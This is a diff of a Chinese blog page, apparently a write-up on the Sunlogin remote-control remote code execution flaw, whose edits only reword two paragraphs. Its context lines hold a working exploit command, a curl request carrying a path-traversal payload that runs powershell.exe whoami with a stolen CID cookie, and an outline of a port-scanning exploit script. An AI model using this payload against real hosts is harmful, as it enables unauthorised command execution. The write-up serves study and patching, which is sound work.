@@ -624,8 +624,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="number">192.168</span><span class="number">.209</span><span class="number">.132</span>:<span class="number">49181</span>/check?cmd=ping../../../../../windows/system32/windowspowershell/v1<span class="number">.0</span>/powershell.exe+whoami --cookie <span class="string">&quot;CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/xrk/image-20221223213449311.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/xrk/image-20221223213449311.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-<h2 id="0x04脚本编写"><a href="#0x04脚本编写" class="headerlink" title="0x04脚本编写"></a>0x04脚本编写</h2><p>参考了下网上大佬的写法</p>
-<p>首先就是要把思路列出来</p>
+<h2 id="0x04脚本编写"><a href="#0x04脚本编写" class="headerlink" title="0x04脚本编写"></a>0x04脚本编写</h2><p>首先就是要把思路列出来</p>
 <p>1、若针对一台目的主机编写脚本，则不用考虑IP和路径，但是端口还是需要尝试的，因为是随机开放，不能事先预知到是哪一个端口</p>
 <p>2、其次最主要的就是先拿到CID，然后构造payload</p>
 <p>扫描端口可以使用socket连接，导入socket模块</p>
@@ -650,7 +649,7 @@
 
 
 
-<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>由于写脚本比较少的缘故，写的还不是很完善，期间还参考了一些资料，动手能力还有待提高，也对这个漏洞有了一定的认识。总的来说这个漏洞的危害性还是比较大的，触发的条件比较低，希望开启向日葵服务的主机早点更新到最新版本。</p>
+<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>由于写脚本比较少的缘故，写的还不是很完善，期间还参考了一些资料，动手能力还有待提高。总的来说这个漏洞的危害性还是比较大的，触发的条件比较低，开启向日葵服务的主机需要更新到最新版本。</p>
 
       </div>
       <div class="post-tags-categories">
